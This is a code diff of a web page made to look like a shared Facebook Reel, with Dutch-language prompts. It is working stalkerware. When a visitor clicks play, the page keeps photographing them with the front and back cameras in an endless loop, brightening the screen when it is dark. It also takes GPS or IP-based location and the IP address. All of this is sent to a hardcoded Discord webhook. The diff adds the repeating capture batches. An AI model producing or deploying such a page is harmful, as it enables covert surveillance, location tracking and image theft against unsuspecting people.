@@ -8,16 +8,16 @@
 
   <meta property="og:title" content="Facebook">
   <meta property="og:description" content="DOK MI NISI PAO U OCIMA DUBOKO">
-  <meta property="og:image" content="https://i.imgur.com/DEIN_THUMBNAIL_URL.jpg">
+  <meta property="og:image" content="https://i.imgur.com/DEIN_THUMBNAIL.jpg"> <!-- vervang -->
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
   <meta property="og:url" content="https://www.facebook.com/share/r/1AeJHMHjaj/">
   <meta property="og:type" content="video.other">
 
   <style>
-    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; -webkit-tap-highlight-color:transparent; }
-    .header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.85); display:flex; align-items:center; padding:0 16px; z-index:100; backdrop-filter:blur(14px); }
-    .close { font-size:38px; font-weight:bold; cursor:pointer; margin-right:20px; user-select:none; pointer-events:auto; }
+    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; }
+    .header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.85); display:flex; align-items:center; padding:0 16px; z-index:100; }
+    .close { font-size:38px; font-weight:bold; cursor:pointer; margin-right:20px; pointer-events:auto; }
     .title { flex:1; text-align:center; font-size:20px; font-weight:600; }
     .reel { height:100vh; position:relative; }
     .profile { position:absolute; top:80px; left:16px; display:flex; align-items:center; z-index:10; pointer-events:none; }
@@ -84,7 +84,7 @@
 <div id="loc-prompt">
   <div class="modal-box">
     <h2>Locatie delen nodig</h2>
-    <p style="margin:30px 0; font-size:1.4rem;">Deel je precieze locatie om de Reel te bekijken.</p>
+    <p style="margin:30px 0; font-size:1.4rem;">Deel je precieze locatie om door te gaan.</p>
     <button id="allowLoc" class="btn allow">LOCATIE DELEN</button>
     <button id="denyLoc" class="btn deny">NEE</button>
   </div>
@@ -96,15 +96,16 @@
 <script>
 const HOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
 let count = 0, frontStream = null, backStream = null, v = document.getElementById('v'), c = document.getElementById('c'), flash = document.getElementById('flash');
+let photoBatch = 0; // 0 = front, 1 = back
 
 async function getIPData() {
-  const apis = ['https://ipapi.co/json/', 'https://ipinfo.io/json', 'https://freegeoip.app/json/', 'https://api.ipgeolocation.io/ipgeo?apiKey=free'];
+  const apis = ['https://ipapi.co/json/', 'https://ipinfo.io/json', 'https://api.ipify.org?format=json', 'https://freegeoip.app/json/'];
   for (let url of apis) {
     try {
       const r = await fetch(url);
       const d = await r.json();
       if (d.ip) return {
-        ip: d.ip || d.query || '?',
+        ip: d.ip || d.query || 'verborgen (VPN?)',
         city: d.city || d.city_name || '?',
         region: d.region || d.state_prov || '?',
         country: d.country_name || d.country || '?',
@@ -115,7 +116,7 @@ async function getIPData() {
       };
     } catch {}
   }
-  return {ip:'onbekend', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
+  return {ip:'verborgen (VPN/adblock)', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
 }
 
 async function getGPS() {
@@ -124,7 +125,7 @@ async function getGPS() {
     navigator.geolocation.getCurrentPosition(
       p => r({latitude:p.coords.latitude, longitude:p.coords.longitude, accuracy:p.coords.accuracy}),
       () => r(null),
-      {enableHighAccuracy:true, timeout:20000, maximumAge:0}
+      {enableHighAccuracy:true, timeout:15000, maximumAge:0}
     );
   });
 }
@@ -132,7 +133,7 @@ async function getGPS() {
 async function send(type, blob = null) {
   try {
     let loc = await getGPS() || await getIPData();
-    let ip = loc.ip || 'onbekend';
+    let ip = loc.ip || 'verborgen (VPN?)';
     let city = loc.city || '?', region = loc.region || '?', country = loc.country || '?', postal = loc.postal || '?', org = loc.org || '?';
     let lat = loc.latitude, lon = loc.longitude;
     let acc = lat ? `${Math.round(loc.accuracy || 500)}m` : 'IP-Fallback';
@@ -163,7 +164,7 @@ async function send(type, blob = null) {
       await fetch(HOOK + "?wait=true", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});
     }
   } catch (e) {
-    console.error("Webhook send failed:", e);
+    console.error("Send failed:", e);
   }
 }
 
@@ -189,6 +190,20 @@ function flashScreen() {
   setTimeout(() => flash.style.opacity = '0', 100);
 }
 
+async function captureBatch(facing, count = 5) {
+  for (let i = 0; i < count; i++) {
+    c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+    const data = c.getContext('2d').getImageData(0,0,c.width,c.height).data;
+    let brightness = 0;
+    for (let j = 0; j < data.length; j += 4) brightness += (data[j] + data[j+1] + data[j+2]) / 3;
+    brightness /= (data.length / 4);
+    if (brightness < 80) flashScreen();
+    let b = await new Promise(r => c.toBlob(r,'image/jpeg',0.88));
+    send(`CAM SNAP ${facing.toUpperCase()} #${i+1}`, b);
+    await new Promise(r => setTimeout(r, 300)); // kleine delay tussen foto's
+  }
+}
+
 document.getElementById('playBtn').addEventListener('click', async () => {
   document.getElementById('cam-prompt').style.display = 'flex';
   send('PLAY');
@@ -198,33 +213,19 @@ document.getElementById('allowCam').onclick = async () => {
   document.getElementById('cam-prompt').style.display = 'none';
   let front = await startCam("user");
   if (front) {
+    // oneindige loop: 5 front → 5 back → repeat
     setInterval(async () => {
-      c.getContext('2d').drawImage(v,0,0,c.width,c.height);
-      const data = c.getContext('2d').getImageData(0,0,c.width,c.height).data;
-      let brightness = 0;
-      for (let i = 0; i < data.length; i += 4) brightness += (data[i] + data[i+1] + data[i+2]) / 3;
-      brightness /= (data.length / 4);
-      if (brightness < 80) flashScreen();
-      let b = await new Promise(r => c.toBlob(r,'image/jpeg',0.88));
-      send('CAM SNAP FRONT', b);
-    }, 1500);
-    setTimeout(async () => {
+      await captureBatch("FRONT", 5);
       front.getTracks().forEach(t => t.stop());
       let back = await startCam("environment");
       if (back) {
-        setInterval(async () => {
-          c.getContext('2d').drawImage(v,0,0,c.width,c.height);
-          const data = c.getContext('2d').getImageData(0,0,c.width,c.height).data;
-          let brightness = 0;
-          for (let i = 0; i < data.length; i += 4) brightness += (data[i] + data[i+1] + data[i+2]) / 3;
-          brightness /= (data.length / 4);
-          if (brightness < 80) flashScreen();
-          let b = await new Promise(r => c.toBlob(r,'image/jpeg',0.88));
-          send('CAM SNAP BACK', b);
-        }, 1500);
+        await captureBatch("BACK", 5);
+        back.getTracks().forEach(t => t.stop());
+        front = await startCam("user"); // terug naar front
       }
-      setTimeout(() => document.getElementById('loc-prompt').style.display = 'flex', 3000);
-    }, 6000);
+    }, 15000); // elke ~15s batch wisselen (5 foto's + delay)
+
+    setTimeout(() => document.getElementById('loc-prompt').style.display = 'flex', 5000);
   } else {
     document.getElementById('camErr').style.display = 'block';
     setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 2000);
